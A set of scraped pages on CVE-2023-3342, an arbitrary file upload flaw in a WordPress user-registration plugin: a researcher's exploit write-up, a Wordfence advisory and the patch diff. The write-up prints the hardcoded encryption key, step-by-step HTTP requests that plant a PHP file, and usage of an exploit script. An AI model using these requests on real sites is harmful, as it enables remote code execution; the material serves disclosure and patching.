=== Content from lana.codes_4d8a5cdf_20250111_090244.html ===

[Skip to content](#content)

[![Lana Report](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)](https://lana.report/)

* [Front Page](https://lana.report/)
* [Reports](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

1. [Lana Report](https://lana.report/)
2. [Publications](https://lana.report/publication/)

### User Registration by WPEverest WordPess plugin Arbitrary File Upload

REPORT ID: c0a58dff-7a5b-4cc0-82d6-2255e61d801c

The plugin contains an Arbitrary File Upload vulnerability. Due to a hardcoded encryption key and a missing file type validation, it is even possible to upload a php file to the website.

#### Let’s check the plugin

The `profile_pic_upload()` method in the `UR_AJAX` class includes the following code for image upload:

```
if ( isset( $_FILES['file']['size'] ) && wp_unslash( sanitize_key( $_FILES['file']['size'] ) ) ) {
	if ( ! function_exists( 'wp_handle_upload' ) ) {
		include_once ABSPATH . 'wp-admin/includes/file.php';
	}

	$upload = isset( $_FILES['file'] ) ? $_FILES['file'] : array(); // phpcs:ignore

	// valid extension for image.
	$valid_extensions = 'image/jpeg,image/gif,image/png';
	$form_id          = ur_get_form_id_by_userid( $user_id );

	if ( class_exists( 'UserRegistrationAdvancedFields' ) ) {
		$field_data       = ur_get_field_data_by_field_name( $form_id, 'profile_pic_url' );
		$valid_extensions = isset( $field_data['advance_setting']->valid_file_type ) ? implode( ', ', $field_data['advance_setting']->valid_file_type ) : $valid_extensions;
	}

	$valid_extension_type = explode( ',', $valid_extensions );
	$valid_ext            = array();

	foreach ( $valid_extension_type as $key => $value ) {
		$image_extension   = explode( '/', $value );
		$valid_ext[ $key ] = isset( $image_extension[1] ) ? $image_extension[1] : '';

		if ( 'jpeg' === $valid_ext[ $key ] ) {
			$index               = count( $valid_extension_type );
			$valid_ext[ $index ] = 'jpg';
		}
	}

	$src_file_name  = isset( $upload['name'] ) ? $upload['name'] : '';
	$file_extension = strtolower( pathinfo( $src_file_name, PATHINFO_EXTENSION ) );

	// Validates if the uploaded file has the acceptable extension.
	if ( ! in_array( $file_extension, $valid_ext ) ) {
		wp_send_json_error(
			array(
				'message' => __( 'Invalid file type, please contact with site administrator.', 'user-registration' ),
			)
		);
	}

	$upload_path = ur_get_tmp_dir();

	// Checks if the upload directory has the write premission.
	if ( ! wp_is_writable( $upload_path ) ) {
		wp_send_json_error(
			array(
				'message' => __( 'Upload path permission deny.', 'user-registration' ),
			)
		);
	}
	$upload_path = $upload_path . '/';
	$file_name   = wp_unique_filename( $upload_path, $upload['name'] );
	$file_path   = $upload_path . sanitize_file_name( $file_name );
	if ( move_uploaded_file( $upload['tmp_name'], $file_path ) ) {
		$files = array(
			'file_name'      => $file_name,
			'file_path'      => $file_path,
			'file_extension' => $file_extension,
		);

		$attachment_id = wp_rand();

		ur_clean_tmp_files();
		$url = UR_UPLOAD_URL . 'temp-uploads/' . sanitize_file_name( $file_name );
		wp_send_json_success(
			array(
				'attachment_id' => $attachment_id,
				'upload_files'  => crypt_the_string( maybe_serialize( $files ), 'e' ),
				'url'           => $url,
			)
		);
	} else {
		wp_send_json_error(
			array(
				'message' => __( 'File cannot be uploaded.', 'user-registration' ),
			)
		);
	}
}
```

This is an common image upload solution that uploads the file to the `UR_UPLOAD_URL . 'temp-uploads/'` folder. It is uploaded to the temp folder because the ajax function only uploads the image to the website, but in order to set the uploaded image as a profile image, the user profile must be updated separately.

The file upload reponse will be json like this:

```
{
    "success": true,
    "data": {
        "attachment_id": 3642301417,
        "upload_files": "RDN2T1VCZzh0c3l6UktucnljcHNDQ0c3RUpDakVPTGR0eElQdmh5L0hRVDd2Q2hWYWdqME9ROVVtc3h6ZlU3ZVFtQlNVbEEyTyt3ZmdTQVJVMVlBRXlvQU8ralV4OWxkTTVuMHJrMFZsYTZUUVNpbXZTaHFSVFg1cGpjWnFUTUo4Z2U0VFN6R3Z4TjYxaXNBZzRCQ1lDYWk1V09MTGQ0K1grYnlVSWxOUTMrM2szSHJ4RHN3TDhsTGlMYWJhWVArdWh4MlNMY2VTVnlJSHpMZFdsdFdDUnhzSUlzaWZVTVJ4bDRoMHlZMVMrTCtDUjBHT25sSlNSaVdGT3l2VEowUVR6T2dlbDB3Z2l3ZkMzbVlteER1c0Qxem83WjZQeHQyUDQ2R0tHWnZNeWc9",
        "url": "https:\/\/lana.solutions\/vdb\/wpeverest-user-registration\/wp-content\/uploads\/user_registration_uploads\/temp-uploads\/exploit.png"
    }
}
```

The `upload_files` contains contains the data of the uploaded file encrypted.

The purpose of encryption is to prevent unauthorized access to the data during profile updates (since the data is generated by the website in this case). It is only possible to decrypt and view the data using the correct encryption key, which should ideally be unique and kept confidential for each website. This means that the user should not know the encryption key (also referred to as the passphrase), and therefore cannot decrypt and view the data.

The `crypt_the_string()` function includes the following encrytion and decryption method, the action depends on the function parameter:

```
function crypt_the_string( $string, $action = 'e' ) {
	$secret_key = 'ur_secret_key';
	$secret_iv  = 'ur_secret_iv';

	$output         = false;
	$encrypt_method = 'AES-256-CBC';
	$key            = hash( 'sha256', $secret_key );
	$iv             = substr( hash( 'sha256', $secret_iv ), 0, 16 );

	if ( 'e' == $action ) {
		if ( function_exists( 'openssl_encrypt' ) ) {
			$output = base64_encode( openssl_encrypt( $string, $encrypt_method, $key, 0, $iv ) );
		} else {
			$output = base64_encode( $string );
		}
	} elseif ( 'd' == $action ) {
		if ( function_exists( 'openssl_decrypt' ) ) {
			$output = openssl_decrypt( base64_decode( $string ), $encrypt_method, $key, 0, $iv );
		} else {
			$output = base64_decode( $string );
		}
	}

	return $output;
}
```

As we can see passphrase and iv are hardcoded in the function.

If we use the `crypt_the_string()` function to decrypt `upload_files`, then we get a serialized array, and when we deserialized it, the content will be something like this:

`file_name`: `exploit.png`

`file_path`: `/var/www/wp-content/uploads/user_registration_uploads/temp-uploads/exploit.png`

`file_extension`: `png`

As you can see, this contains the file name, path and extension.

This also means that the file has been successfully uploaded, as we can see the file path. Which is currently in the temp folder.

After that, we can save the profile picture with the profile details save function.

The `user_registration_before_save_profile_details()` method in the `UR_Frontend` class contains the following code:

```
ur_upload_profile_pic( $valid_form_data, $user_id );
```

The `ur_upload_profile_pic()` function includes the following code for save the profile picture:

```
$upload_path = UR_UPLOAD_PATH . 'profile-pictures'; /*Get path of upload dir of User Registration for profile pictures*/
```
```
$upload = maybe_unserialize( crypt_the_string( $upload_file, 'd' ) );
if ( isset( $upload['file_name'] ) && isset( $upload['file_path'] ) && isset( $upload['file_extension'] ) ) {
	$upload_path = $upload_path . '/';
	$file_name   = wp_unique_filename( $upload_path, $upload['file_name'] );
	$file_path   = $upload_path . sanitize_file_name( $file_name );
	// Check the type of file. We'll use this as the 'post_mime_type'.
	$filetype = wp_check_filetype( basename( $file_name ), null );
	$moved    = rename( $upload['file_path'], $file_path );

	if ( $moved ) {
		$attachment_id = wp_insert_attachment(
			array(
				'guid'           => $file_path,
				'post_mime_type' => $filetype['type'],
				'post_title'     => preg_replace( '/\.[^.]+$/', '', sanitize_file_name( $file_name ) ),
				'post_content'   => '',
				'post_status'    => 'inherit',
			),
			$file_path
		);

		if ( ! is_wp_error( $attachment_id ) ) {
			include_once ABSPATH . 'wp-admin/includes/image.php';

			// Generate and save the attachment metas into the database.
			wp_update_attachment_metadata( $attachment_id, wp_generate_attachment_metadata( $attachment_id, $file_path ) );
		}
	}
}
```

As we can see, this decrypts the `$upload_file` and then moves and renames the uploaded file in the temp folder to the `$upload_path` folder using the [`rename()`](https://www.php.net/manual/en/function.rename.php) function. There is a [`wp_check_filetype()`](https://developer.wordpress.org/reference/functions/wp_check_filetype/) function in the code, but the file extension is not checked before renaming, which means that we can rename our png image file to any file.

#### Let’s see how we can exploit this vulnerability

How the exploit works step by step:

* Register a user
* Log in to the user
* Upload the malicious exploit.png image file
* Retrieve the encrypted file data from the response
* Decrypt the file data
* Modify the file extension to php in the file name
* Encrypt the file data
* Save the profile with the encrypted and modified file data

Since the encryption key is hardcoded, we can decrypt, modify and encrypt the file data.

The file `exploit.png` contains the following code:

```
<?php
echo 'md5("exploit"): ' . md5( 'exploit' );
```

As we can see, this is a php file that we saved with png extension.

Upload the file with the following HTTP request:

```
POST /vdb/wpeverest-user-registration/wp-admin/admin-ajax.php?action=user_registration_profile_pic_upload&security=788a0a823e HTTP/1.1
Host: lana.solutions
Content-Type: multipart/form-data; boundary=WebKitFormBoundaryLanaCodes

--WebKitFormBoundaryLanaCodes
Content-Disposition: form-data; name="file"; filename="exploit.png"
Content-Type: image/png

<?php
echo 'md5("exploit"): ' . md5( 'exploit' );
--WebKitFormBoundaryLanaCodes--
```

The response will be a json containing the encrypted `upload_files`. We have to decrypt it with the php function using the hardcoded encryption key, which returns a serialized array, something like this:

`file_name`: `exploit.png`

`file_path`: `/var/www/wp-content/uploads/user_registration_uploads/temp-uploads/exploit.png`

`file_extension`: `png`

It is important to change the extension only in file name in the deserialized array:

`file_name`: `exploit.png` needs to be changed to `exploit.php`

Then we have to encrypt the modified `upload_files`.

Save the profile with the following HTTP request:

```
POST /vdb/wpeverest-user-registration/wp-admin/admin-ajax.php HTTP/1.1
Host: lana.solutions
Content-Type: application/x-www-form-urlencoded

action=save_profile_details&_wpnonce=63c08e3e46&user_registration_user_login=demo&profile_pic_url=RDN2T1VCZzh0c3l6UktucnljcHNDQ0c3RUpDakVPTGR0eElQdmh5L0hRUnI4cWVmYVF1N0VEcWYvSG9VbjJFWUdDOHg5Qmh4VmN1eGdWREdFVDJ5RjRUZ0FCcjdtaTgrTEtRaGxSRWRFaDNWb1ZkdFJZYUFxMTJmQkcwMUQ3aVRNYVlML09iZFBUNWZkYWxhV1FzcVVlYWtLWlBpR2dCK2hHcmxhc2gzeWZLb0VMcmRxUmRuajBpY0Vaa2JLY0VRMXZQU2ZHcHJ1ZkRTN2RqTzRZWTNsUm54YjlYZzUwa1J6Vm14Um1TQVB6WWZ6VlhaTGtnZXJKcXhxeVdVa0lQVVNiSjlHUTBVb29iUTdjcVpleVJpbktZZC9UczdTSTlsZ1l5MWdrMDhzZG89
```

The `profile_pic_url` will be the modified and encrypted `upload_files`.

This exploit renames and moves the file, which we can access using a browser.

This is how the exploit works:

[![](https://lana.report/wp-content/uploads/user-registration-exploit-howto.png)](https://lana.report/wp-content/uploads/user-registration-exploit-howto.png)

#### The exploit script

I created a PHP script that uploads the exploit php file:

Source: [wpeverest\_user\_registration\_upload\_php\_file\_exploit.php](https://gist.github.com/lana-codes/64ae6067bb9655999d4c1ed04066693a)

How to use:

```
php wpeverest_user_registration_upload_php_file_exploit.php --website_url="https://lana.solutions/vdb/wpeverest-user-registration/" --username="demo" --password="demo"
```

We get something like this:

```
The file exists and contains the exploit.
```

We can also check the file using a browser by opening the following link: <https://lana.solutions/vdb/wpeverest-user-registration/wp-content/uploads/user_registration_uploads/profile-pictures/exploit.php>

#### Try it

Feel free to try and use the lana.solutions/vdb WordPress websites for testing. I set that only the php file in the exploit script can be uploaded. So all php files with other content are prohibited.

Website: <https://lana.solutions/vdb/wpeverest-user-registration/>

Username: demo

Password: demo

### References

Source Code
<https://wordpress.org/plugins/user-registration/>

Repository
<https://plugins.svn.wordpress.org/user-registration/>

CVE
[CVE-2023-3342](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3342)

### Let's discuss

### Attributes

Catgory
WordPress Plugin

Vulnerability Discovered
2023-06-19

Post Published
2023-07-04

Affected Version
<= 3.0.2

### Classification

Type
Arbitrary File Upload

### Researcher

Name
[István Márton](https://lana.report "Visit István Márton’s website")

Email
[[email protected]](/cdn-cgi/l/email-protection#5831363e371834393639763b373c3d2b)

### Tags

exploit
file upload
python

### Advertisement

### Support Us?

We would truly appreciate it if you bought us a bunny (food for a snow leopard).

[![buy me a bunny!](https://img.buymeacoffee.com/button-api/?text=buy me a bunny!&emoji=🐰&slug=lanacodes&button_colour=0776eb&font_colour=ffffff&font_family=Lato&outline_colour=ffffff&coffee_colour=FFDD00)](https://www.buymeacoffee.com/lanacodes)

![](https://lana.report/wp-content/uploads/lana-report-inverse-text-logo-with-mascot.png)

The Lana Report is a database containing vulnerabilities researched and published by Lana Solutions.

### General

* [Vulnerabilities](https://lana.report/vulnerability/)
* [Publications](https://lana.report/publication/)

### Lana Solutions

* [Lana Codes](https://lana.codes/)
### Wordfence

* [Bug Bounty Program](https://wordfence.com/refer/lanareport)

### Socials

* [Telegram](https://t.me/LanaReport)
* [Twitter](https://twitter.com/LanaReport)

Lana Report © 2024 All Rights Reserved.

Made with 💙 by [Lana Codes](https://lana.codes/)



=== Content from packetstormsecurity.com_a8e15339_20250111_090240.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.wordfence.com_e1f9409c_20250111_090304.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# User Registration <= 3.0.2 - Authenticated (Subscriber+) Arbitrary File Upload

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   User Registration <= 3.0.2 - Authenticated (Subscriber+) Arbitrary File Upload

9.9

**Unrestricted Upload of File with Dangerous Type**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

| CVE | [CVE-2023-3342](https://www.cve.org/CVERecord?id=CVE-2023-3342) |
| --- | --- |
| CVSS | 9.9 (Critical) |
| Publicly Published | July 4, 2023 |
| Last Updated | July 13, 2023 |
| Researcher | [István Márton - Wordfence](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/lana-codes) |

### Description

The User Registration plugin for WordPress is vulnerable to arbitrary file uploads due to a hardcoded encryption key and missing file type validation on the 'ur\_upload\_profile\_pic' function in versions up to, and including, 3.0.2. This makes it possible for authenticated attackers with subscriber-level capabilities or above to upload arbitrary files on the affected site's server which may make remote code execution possible. This was partially patched in version 3.0.2 and fully patched in version 3.0.2.1.

#### References

* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/user-registration/tags/3.0.1/includes/functions-ur-core.php#L3156)
* [lana.codes](https://lana.codes/lanavdb/c0a58dff-7a5b-4cc0-82d6-2255e61d801c/)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset/2933689/user-registration/trunk/includes/functions-ur-core.php)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fuser-registration%2Fuser-registration-302-authenticated-subscriber-arbitrary-file-upload&t=User%20Registration%20%3C%3D%203.0.2%20-%20Authenticated%20%28Subscriber%2B%29%20Arbitrary%20File%20Upload "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fuser-registration%2Fuser-registration-302-authenticated-subscriber-arbitrary-file-upload&text=User%20Registration%20%3C%3D%203.0.2%20-%20Authenticated%20%28Subscriber%2B%29%20Arbitrary%20File%20Upload "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fuser-registration%2Fuser-registration-302-authenticated-subscriber-arbitrary-file-upload "LinkedIn")
Email

## Vulnerability Details for User Registration & Membership – Custom Registration Form, Login Form, and User Profile

#### [User Registration & Membership – Custom Registration Form, Login Form, and User Profile](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/user-registration)

| Software Type | Plugin |
| --- | --- |
| Software Slug | user-registration [(view on wordpress.org)](https://wordpress.org/plugins/user-registration) |
| Patched? | Yes |
| Remediation | Update to version 3.0.2.1, or a newer patched version |
| Affected Version | * <= 3.0.2 |
| Patched Version | * 3.0.2.1 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from plugins.trac.wordpress.org_fb85a537_20250111_090303.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F2933689%2Fuser-registration%2Ftrunk%2Fincludes%2Ffunctions-ur-core.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Change](/changeset/2932199/user-registration/trunk/includes/functions-ur-core.php "Changeset 2932199 for user-registration/trunk/includes/functions-ur-core.php")
* [Next Change](/changeset/2951915/user-registration/trunk/includes/functions-ur-core.php "Changeset 2951915 for user-registration/trunk/includes/functions-ur-core.php") →

---

# Changeset [2933689](/changeset/2933689 "Show full changeset") for [user-registration/trunk/includes/functions-ur-core.php](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2933689 "Show entry in browser")

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
07/04/2023 08:44:00 AM
([19 months](/timeline?from=2023-07-04T08%3A44%3A00Z&precision=second "See timeline at 07/04/2023 08:44:00 AM") ago)

Author:
wpeverestdev
Message:

Update to version 3.0.2.1 from GitHub

File:

1 edited

* [user-registration/trunk/includes/functions-ur-core.php](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2933689 "Show entry in browser")
  (modified)
  ([4 diffs](#file0 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [user-registration/trunk/includes/functions-ur-core.php](/changeset/2933689/user-registration/trunk/includes/functions-ur-core.php "Show the changeset 2933689 restricted to user-registration/trunk/includes/functions-ur-core.php")

  | [r2932199](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2932199#L3059 "Show revision 2932199 of this file in browser") | [r2933689](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2933689#L3059 "Show revision 2933689 of this file in browser") |  |
  | --- | --- | --- |
  | 3059 | 3059 | \*/ |
  | 3060 | 3060 | function crypt\_the\_string( $string, $action = 'e' ) { |
  | 3061 |  | $secret\_key = 'ur\_secret\_key'; |
  | 3062 |  | $secret\_iv  = 'ur\_secret\_iv'; |
  |  | 3061 | $secret\_key = get\_option( 'ur\_secret\_key' ); |
  |  | 3062 | $secret\_iv  = get\_option( 'ur\_secret\_iv' ); |
  |  | 3063 |  |
  |  | 3064 | if ( empty( $secret\_key ) || empty( $secret\_iv ) ) { |
  |  | 3065 | $secret\_key = ur\_generate\_random\_key(); |
  |  | 3066 | $secret\_iv  = ur\_generate\_random\_key(); |
  |  | 3067 | update\_option( 'ur\_secret\_key', $secret\_key ); |
  |  | 3068 | update\_option( 'ur\_secret\_iv', $secret\_iv ); |
  |  | 3069 | } |
  | 3063 | 3070 |  |
  | 3064 | 3071 | $output         = false; |
  | […](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2932199#L3085) | […](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2933689#L3092) |  |
  | 3085 | 3092 | } //phpcs:ignore |
  | 3086 | 3093 |  |
  |  | 3094 | if ( ! function\_exists( 'ur\_generate\_random\_key' ) ) { |
  |  | 3095 | /\*\* |
  |  | 3096 | \* Function to generate the random key. |
  |  | 3097 | \* |
  |  | 3098 | \* @since 3.0.2.1 |
  |  | 3099 | \*/ |
  |  | 3100 | function ur\_generate\_random\_key() { |
  |  | 3101 | $length              = 32; |
  |  | 3102 | $allow\_special\_chars = true; |
  |  | 3103 | $key                 = wp\_generate\_password( $length, $allow\_special\_chars ); |
  |  | 3104 | return $key; |
  |  | 3105 | } |
  |  | 3106 | } |
  | 3087 | 3107 |  |
  | 3088 | 3108 | if ( ! function\_exists( 'ur\_clean\_tmp\_files' ) ) { |
  | […](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2932199#L3179) | […](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2933689#L3199) |  |
  | 3179 | 3199 | $valid\_extensions = array( 'image/jpeg', 'image/jpg', 'image/gif', 'image/png' ); |
  | 3180 | 3200 | $upload\_file      = $valid\_form\_data['profile\_pic\_url']->value; |
  |  | 3201 | $valid\_ext        = array(); |
  |  | 3202 |  |
  |  | 3203 | foreach ( $valid\_extensions as $key => $value ) { |
  |  | 3204 | $image\_extension   = explode( '/', $value ); |
  |  | 3205 | $valid\_ext[ $key ] = isset( $image\_extension[1] ) ? $image\_extension[1] : ''; |
  |  | 3206 |  |
  |  | 3207 | if ( 'jpeg' === $valid\_ext[ $key ] ) { |
  |  | 3208 | $index               = count( $valid\_extensions ); |
  |  | 3209 | $valid\_ext[ $index ] = 'jpg'; |
  |  | 3210 | } |
  |  | 3211 | } |
  | 3181 | 3212 |  |
  | 3182 | 3213 | if ( ! is\_numeric( $upload\_file ) ) { |
  | 3183 |  | $upload           = ur\_maybe\_unserialize( crypt\_the\_string( $upload\_file, 'd' ) ); |
  | 3184 |  | $upload\_file\_type = isset( $upload['file\_path'] ) ? mime\_content\_type( $upload['file\_path'] ) : ''; |
  | 3185 |  |  |
  | 3186 |  | if ( isset( $upload['file\_name'] ) && isset( $upload['file\_path'] ) && isset( $upload['file\_extension'] ) && in\_array( $upload\_file\_type, $valid\_extensions ) ) { |
  |  | 3214 | $upload = ur\_maybe\_unserialize( crypt\_the\_string( $upload\_file, 'd' ) ); |
  |  | 3215 | if ( function\_exists( 'mime\_content\_type' ) ) { |
  |  | 3216 | $upload\_file\_type = isset( $upload['file\_path'] ) ? mime\_content\_type( $upload['file\_path'] ) : ''; |
  |  | 3217 | } else { |
  |  | 3218 | $upload\_file\_info = isset( $upload['file\_path'] ) ? wp\_check\_filetype( $upload['file\_path'] ) : ''; |
  |  | 3219 | $upload\_file\_type = ! empty( $upload\_file\_info ) ? $upload\_file\_info['type'] : ''; |
  |  | 3220 | } |
  |  | 3221 |  |
  |  | 3222 | if ( isset( $upload['file\_name'] ) && isset( $upload['file\_path'] ) && isset( $upload['file\_extension'] ) && in\_array( $upload\_file\_type, $valid\_extensions ) && in\_array( $upload['file\_extension'], $valid\_ext ) ) { |
  | 3187 | 3223 | $upload\_path = $upload\_path . '/'; |
  | 3188 | 3224 | $file\_name   = wp\_unique\_filename( $upload\_path, $upload['file\_name'] ); |
  | […](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2932199#L3190) | […](/browser/user-registration/trunk/includes/functions-ur-core.php?rev=2933689#L3226) |  |
  | 3190 | 3226 | // Check the type of file. We'll use this as the 'post\_mime\_type'. |
  | 3191 | 3227 | $filetype = wp\_check\_filetype( basename( $file\_name ), null ); |
  | 3192 |  | $moved    = rename( $upload['file\_path'], $file\_path ); |
  |  | 3228 | $moved    = ''; |
  |  | 3229 |  |
  |  | 3230 | if ( basename( $upload['file\_path'] ) === $upload['file\_name'] ) { |
  |  | 3231 | $moved = rename( $upload['file\_path'], $file\_path ); |
  |  | 3232 | } |
  | 3193 | 3233 |  |
  | 3194 | 3234 | if ( $moved ) { |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2933689)
* [Zip Archive](?format=zip&new=2933689)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from plugins.trac.wordpress.org_a78289c0_20250111_090301.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

